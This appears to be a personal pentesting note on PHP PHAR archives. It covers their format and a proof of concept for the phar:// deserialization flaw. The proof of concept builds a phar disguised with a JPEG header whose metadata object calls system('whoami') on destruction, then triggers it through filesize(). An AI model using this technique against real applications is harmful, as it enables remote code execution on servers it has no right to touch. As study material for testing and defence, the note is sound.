# PHAR

> `.phar` are `.php` archives just like `.jar` are.
> `.phar` archives can be 3 types : `zip`, `tar` and `phar`
> `zip` and `tar` format requires phar extension to be enabled 


> [!NOTE] Usage
> While PHAR was originally intended for web usage, it is often used by command line utilities. Popular applications distributed in PHAR format, include [Composer](https://en.wikipedia.org/wiki/Composer_(software) "Composer (software)") and [PHPUnit](https://en.wikipedia.org/wiki/PHPUnit "PHPUnit").

# Format

> [!NOTES] PHAR format specifications
> - **Stub section** : the stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion.
> - **Manifest :** Contains metadata about the archive
> - **File contents :** Contains actual files in the archive
> - **Signature (optional) :** for verifying archive integrity

# Execution

> Assuming the PHAR extension is enabled, all PHAR files may be executed simply by executing them with the PHP interpreter ("`php file.phar`"). If the PHAR extension is not enabled, only PHAR format can be executed.

# PHAR Deserialization flaw

# Read via `phar://`

**Compile with**

```php
<?php

class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();

?>
```

**and read it by:**
```php
<?php
class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

echo filesize("phar://test.phar"); 
?>
```

# Resources

- https://en.wikipedia.org/wiki/PHAR_(file_format)
- File format : https://www.php.net/manual/en/phar.fileformat.phar.php
- https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization